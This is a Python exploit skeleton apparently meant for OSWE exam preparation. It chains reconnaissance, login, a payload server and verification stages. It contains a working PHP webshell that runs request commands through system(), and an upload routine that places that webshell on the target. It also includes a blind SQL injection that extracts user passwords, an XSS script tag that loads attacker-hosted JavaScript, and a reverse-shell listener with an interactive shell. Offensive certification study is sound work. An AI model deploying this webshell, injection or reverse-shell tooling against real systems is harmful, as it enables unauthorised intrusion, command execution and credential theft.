#!/usr/bin/env python3
"""
OSWE Advanced PoC Skeleton - Production Ready

This skeleton integrates all advanced features:
- Structured logging (modules/logger.py)
- Payload server (modules/payload_server.py)
- Stage management (modules/stages.py)
- Blind SQLi (modules/sqli.py)

Adapt this template for your OSWE exam challenges.

Usage:
    python3 poc_advanced.py --target-ip 192.168.1.100 --username admin --password secret
"""

import argparse
import requests
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, Any
import urllib3

# Import custom modules
from modules import (
    create_logger,
    PayloadServer,
    StageManager,
    BlindSQLi,
    MySQLDialect,
    InteractiveListener
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CONFIGURATION
# ============================================================================

CHARSETS = {
    "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "hex": "0123456789abcdef",
    "ascii": "".join(chr(i) for i in range(32, 127)),
    "base64": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
    "numeric": "0123456789",
}

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """
    Centralized exploit configuration and runtime state.

    This dataclass holds all configuration and state needed throughout
    the exploit lifecycle.
    """

    # Required configuration
    target_ip: str
    target_port: int
    target_api_port: int
    attacker_ip: str
    attacker_port: int
    payload_port: int
    
    # Optional configuration with defaults
    protocol: str = "http"
    delay: int = 3
    proxy: Optional[str] = None
    charset: str = "alnum"
    username: Optional[str] = None
    password: Optional[str] = None

    # Runtime state (all with defaults)
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    authenticated: bool = field(default=False, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)
    logger: Any = field(default=None, repr=False)
    payload_server: Optional[PayloadServer] = field(default=None, repr=False)
    listener: Optional[InteractiveListener] = field(default=None, repr=False)
    sqli: Optional[BlindSQLi] = field(default=None, repr=False)
    session_cookie: Optional[str] = field(default=None, repr=False)
    csrf_token: Optional[str] = field(default=None, repr=False)
    extracted_data: dict = field(default_factory=dict, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            target_api_port=args.target_api_port,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            payload_port=args.payload_port,
            delay=args.delay,
            proxy=args.proxy,
            charset=args.charset,
            username=args.username,
            password=args.password,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_api_url(self) -> str:
        """Construct API URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_api_port}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments with organized groups."""
    parser = argparse.ArgumentParser(
        description="OSWE Advanced PoC Skeleton",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploitation
  %(prog)s --target-ip 192.168.1.100 --username admin --password secret

  # With Burp proxy for debugging
  %(prog)s --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

  # Custom delay for blind SQLi
  %(prog)s --target-ip 192.168.1.100 --delay 5 --charset hex

  # Full custom configuration
  %(prog)s --target-ip 192.168.1.100 --target-port 8080 \
           --listening-ip 10.10.14.5 --payload-port 8000 \
           --username admin --password pass123
        """
    )

    # Target options
    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target server IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=80, help="Target web port (default: 80)"
    )
    target_group.add_argument(
        "--target-api-port", type=int, default=5000, help="Target API port (default: 5000)"
    )

    # Attacker options
    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--listening-ip", default="127.0.0.1", help="IP to listen on (default: 127.0.0.1)"
    )
    attacker_group.add_argument(
        "--listening-port", type=int, default=9001, help="Reverse shell port (default: 9001)"
    )
    attacker_group.add_argument(
        "--payload-port", type=int, default=8000, help="Payload server port (default: 8000)"
    )

    # Exploit options
    exploit_group = parser.add_argument_group("Exploit options")
    exploit_group.add_argument(
        "--delay", type=int, default=3, help="Delay for timing attacks (default: 3)"
    )
    exploit_group.add_argument(
        "--charset", choices=CHARSETS.keys(), default="alnum",
        help="Charset for blind extraction (default: alnum)"
    )

    # Identity options
    identity_group = parser.add_argument_group("Identity options")
    identity_group.add_argument(
        "--username", help="Username for authentication"
    )
    identity_group.add_argument(
        "--password", help="Password for authentication"
    )

    # Optional options
    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy for debugging (e.g., http://127.0.0.1:8080)"
    )
    optional_group.add_argument(
        "--verbose", action="store_true", help="Enable verbose logging"
    )

    return parser.parse_args()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def liveness_check(ctx: ExploitContext) -> bool:
    """
    Verify target is reachable before starting exploitation.
    
    This function performs a simple HTTP GET to the target base URL
    to ensure the target is up and responsive.
    
    Args:
        ctx: ExploitContext with target configuration
        
    Returns:
        True if target is reachable, False otherwise
    """
    ctx.logger.info(f"Performing liveness check: {ctx.get_base_url()}")
    
    try:
        response = ctx.session.get(
            ctx.get_base_url(),
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )
        
        if response.status_code == 200:
            ctx.logger.success(f"Target is reachable (HTTP 200)")
            return True
        elif response.status_code in [301, 302, 307, 308]:
            ctx.logger.warning(f"Target redirected to: {response.headers.get('Location')}")
            return True
        else:
            ctx.logger.warning(f"Target returned HTTP {response.status_code}")
            return True  # Still reachable, just unexpected status
            
    except requests.exceptions.ConnectionError as e:
        ctx.logger.error(f"Connection refused: {e}")
        return False
    except requests.exceptions.Timeout as e:
        ctx.logger.error(f"Connection timeout: {e}")
        return False
    except Exception as e:
        ctx.logger.error(f"Liveness check failed: {e}")
        return False


# ============================================================================
# EXPLOIT STAGES (customize these for your vulnerability)
# ============================================================================

def stage_recon(ctx: ExploitContext, manager: StageManager) -> bool:
    """Stage 1: Reconnaissance - verify target is reachable."""
    ctx.logger.info(f"Target: {ctx.get_base_url()}")

    try:
        ctx.logger.http_request("GET", ctx.get_base_url())

        response = ctx.session.get(
            ctx.get_base_url(),
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        ctx.logger.http_response(response.status_code, ctx.get_base_url(), response.text[:500])

        if response.status_code == 200:
            ctx.logger.success(f"Target is reachable (HTTP {response.status_code})")
            return True
        else:
            ctx.logger.error(f"Unexpected status code: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        ctx.logger.error(f"Connection failed: {e}")
        return False

def stage_authenticate(ctx: ExploitContext, manager: StageManager) -> bool:
    """Stage 2: Authentication - login to target."""
    if not ctx.username or not ctx.password:
        ctx.logger.warning("No credentials provided, skipping authentication")
        return True

    ctx.logger.info(f"Attempting authentication as {ctx.username}")

    login_url = f"{ctx.get_base_url()}/login"
    login_data = {
        "username": ctx.username,
        "password": ctx.password,
        "submit": "Login"
    }

    try:
        ctx.logger.http_request("POST", login_url, data=login_data)

        response = ctx.session.post(
            login_url,
            data=login_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )

        ctx.logger.http_response(response.status_code, login_url)

        # Check for successful authentication (customize per app)
        if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
            ctx.logger.success(f"Successfully authenticated as {ctx.username}")
            ctx.logger.credential(ctx.username, ctx.password, "provided")
            ctx.authenticated = True
            return True
        else:
            ctx.logger.error("Authentication failed")
            return False

    except requests.exceptions.RequestException as e:
        ctx.logger.error(f"Authentication error: {e}")
        return False

def stage_setup_payload_server(ctx: ExploitContext, manager: StageManager) -> bool:
    """Stage 3: Setup payload server for hosting exploits."""
    ctx.logger.info(f"Starting payload server on port {ctx.payload_port}")

    try:
        # Initialize payload server
        ctx.payload_server = PayloadServer(port=ctx.payload_port, verbose=False)

        # Example: Add PHP webshell
        php_shell = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>"""
        ctx.payload_server.add_payload("/shell.php", php_shell.encode(), "application/x-php")

        # Example: Add callback handler for blind RCE verification
        def rce_callback(request_data):
            ctx.logger.success(f"RCE callback from {request_data['client']}")

        ctx.payload_server.add_callback_handler("/rce-verify", rce_callback)

        # Start server in background
        ctx.payload_server.start(blocking=False)

        ctx.logger.success(f"Payload server running at: {ctx.payload_server.get_url()}")
        ctx.logger.info(f"Shell URL: {ctx.payload_server.get_url('/shell.php')}")

        return True

    except Exception as e:
        ctx.logger.error(f"Failed to start payload server: {e}")
        return False

def stage_exploit(ctx: ExploitContext, manager: StageManager) -> bool:
    """Stage 4: Main exploitation logic."""
    ctx.logger.info("Executing main exploitation")

    # TODO: Implement your vulnerability-specific exploitation here

    # Example 1: SQL Injection
    if False:  # Change to True to enable SQLi
        ctx.logger.info("Attempting SQL injection...")

        sqli = BlindSQLi(
            url=f"{ctx.get_base_url()}/vuln.php",
            dialect=MySQLDialect(),
            delay=ctx.delay,
            param_name="id",
            injection_point="1{payload}",
            logger=ctx.logger
        )

        # Extract data
        password = sqli.extract("SELECT password FROM users WHERE id=1", use_binary=True)
        ctx.logger.success(f"Extracted password: {password}")

    # Example 2: File Upload
    if False:  # Change to True to enable file upload
        ctx.logger.info("Attempting file upload...")

        upload_url = f"{ctx.get_base_url()}/upload"
        files = {
            "file": ("shell.php", php_shell, "application/x-php")
        }

        response = ctx.session.post(upload_url, files=files, verify=False)

        if response.status_code == 200:
            ctx.logger.success("File uploaded successfully")
            ctx.shell_url = f"{ctx.get_base_url()}/uploads/shell.php"
        else:
            ctx.logger.error("File upload failed")

    # Example 3: XSS payload delivery
    if False:  # Change to True to enable XSS
        ctx.logger.info("Injecting XSS payload...")

        xss_payload = f'<script src="{ctx.payload_server.get_url("/xss.js")}"></script>'
        ctx.logger.payload_execution("XSS", xss_payload, True)

    # Placeholder for actual exploitation
    ctx.logger.warning("Main exploitation stage not implemented - customize for your vulnerability")

    return True

def stage_verify(ctx: ExploitContext, manager: StageManager) -> bool:
    """
    Stage 5: Verify exploitation was successful.
    
    This stage supports multiple verification methods:
    1. Webshell verification via HTTP request
    2. Reverse shell capture via listener
    """
    ctx.logger.info("Verifying exploitation")

    # Method 1: Webshell verification
    if ctx.shell_url:
        test_url = f"{ctx.shell_url}?cmd=id"
        ctx.logger.info(f"Testing webshell: {test_url}")

        try:
            response = ctx.session.get(test_url, timeout=10, verify=False)

            if response.status_code == 200 and "uid=" in response.text:
                ctx.logger.success("Webshell RCE confirmed!")
                ctx.logger.info(f"Output: {response.text[:200]}")
                return True
            else:
                ctx.logger.error("Webshell verification failed")
                return False

        except Exception as e:
            ctx.logger.error(f"Webshell verification error: {e}")
            return False

    # Method 2: Reverse shell capture via listener
    # Example: Set ctx.listener before this stage and trigger reverse shell
    if ctx.listener and ctx.listener.is_connected():
        ctx.logger.success("Reverse shell connection established!")
        ctx.logger.info(f"Connected from: {ctx.listener.get_client_info()}")
        
        # Send a test command to verify shell is working
        result = ctx.listener.send_command("id")
        if result and "uid=" in result:
            ctx.logger.success("Shell verified with 'id' command")
            ctx.logger.info(f"Shell output: {result[:200]}")
            
            # Optionally enter interactive shell
            ctx.logger.info("Entering interactive shell...")
            ctx.listener.interactive_shell()
            return True
        else:
            ctx.logger.error("Shell verification failed - command did not return expected output")
            return False

    # Method 3: Start listener and wait for connection
    # Uncomment this section to enable automatic listener setup
    if False:  # Change to True to enable
        ctx.logger.info("Starting listener for reverse shell verification")
        
        ctx.listener = InteractiveListener(
            port=ctx.attacker_port,
            initial_commands=["whoami", "hostname", "id", "pwd"]
        )
        
        if ctx.listener.start(blocking=False):
            ctx.logger.success(f"Listener started on port {ctx.attacker_port}")
            ctx.logger.info("Trigger reverse shell on target now...")
            
            # Wait for connection with timeout
            if ctx.listener.wait_for_connection(timeout=60):
                ctx.logger.success("Reverse shell connected!")
                ctx.listener.interactive_shell()
                return True
            else:
                ctx.logger.error("No reverse shell connection received (timeout)")
                return False
        else:
            ctx.logger.error("Failed to start listener")
            return False

    ctx.logger.warning("No verification method available")
    return True

# ============================================================================
# ALTERNATIVE: Step-Based Pattern
# ============================================================================

"""
For simpler exploits, you may prefer a step-based pattern instead of stage-based.
Here's an example of how to implement step-based exploitation:

def step1_authenticate(ctx: ExploitContext) -> bool:
    \"\"\"Step 1: Authenticate to target.\"\"\"
    ctx.logger.info("Step 1: Authentication")
    
    # Store session cookie for later steps
    ctx.session_cookie = "example_session_id"
    ctx.logger.success("Authenticated successfully")
    return True

def step2_extract_token(ctx: ExploitContext) -> bool:
    \"\"\"Step 2: Extract CSRF token using stored session.\"\"\"
    ctx.logger.info("Step 2: Token extraction")
    
    # Use session_cookie from step 1
    ctx.logger.info(f"Using session: {ctx.session_cookie}")
    
    ctx.csrf_token = "example_csrf_token"
    ctx.extracted_data['csrf_token'] = ctx.csrf_token
    ctx.logger.success("Token extracted")
    return True

def step3_exploit(ctx: ExploitContext) -> bool:
    \"\"\"Step 3: Exploit using collected data.\"\"\"
    ctx.logger.info("Step 3: Exploitation")
    
    # Use data from previous steps
    ctx.logger.info(f"Using CSRF token: {ctx.extracted_data.get('csrf_token')}")
    
    ctx.logger.success("Exploitation complete")
    return True

def run_step_based(ctx: ExploitContext) -> bool:
    \"\"\"Run step-based exploit.\"\"\"
    steps = [
        ("Authentication", step1_authenticate),
        ("Token Extraction", step2_extract_token),
        ("Exploitation", step3_exploit),
    ]
    
    for step_name, step_func in steps:
        ctx.logger.stage(step_name)
        if not step_func(ctx):
            ctx.logger.error(f"Step '{step_name}' failed")
            return False
    
    return True

# Usage in main():
# if USE_STEP_BASED:
#     success = run_step_based(ctx)
"""

USE_STEP_BASED = False  # Set to True to use step-based pattern instead


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution flow with stage management."""

    # Parse arguments
    args = parse_args()

    # Create logger
    log = create_logger("advanced_poc", verbose=args.verbose)

    log.info("OSWE Advanced PoC Skeleton")
    log.info("=" * 60)

    # Build context
    ctx = ExploitContext.from_args(args)
    ctx.logger = log

    # Perform liveness check before anything else
    if not liveness_check(ctx):
        log.error("Target is not reachable. Aborting.")
        log.close()
        sys.exit(1)

    # Use step-based or stage-based pattern
    if USE_STEP_BASED:
        # Alternative: Step-based pattern for simpler exploits
        log.info("Using step-based execution pattern")
        log.error("Step-based pattern not implemented in this example")
        success = False
    else:
        # Standard: Stage-based pattern
        log.info("Using stage-based execution pattern")
        
        # Initialize stage manager
        manager = StageManager(logger=log, fail_fast=False)

        # Register stages
        manager.add_stage("Reconnaissance", stage_recon)
        manager.add_stage("Authentication", stage_authenticate, depends_on=["Reconnaissance"])
        manager.add_stage("Payload Server Setup", stage_setup_payload_server, optional=True)
        manager.add_stage("Exploitation", stage_exploit, depends_on=["Authentication"])
        manager.add_stage("Verification", stage_verify, depends_on=["Exploitation"])

        # Execute all stages
        success = manager.execute(ctx, manager)

        # Print stage summary
        manager.print_summary()

    # Cleanup
    if ctx.payload_server:
        ctx.payload_server.stop()
    
    if ctx.listener:
        ctx.listener.stop()

    # Final summary
    log.summary(
        Target=ctx.get_base_url(),
        Authenticated=ctx.authenticated,
        Shell_URL=ctx.shell_url or "N/A",
        Listener_Port=ctx.attacker_port if ctx.listener else "N/A",
        Overall_Status="SUCCESS" if success else "PARTIAL/FAILED"
    )

    log.close()

    # Exit with appropriate code
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
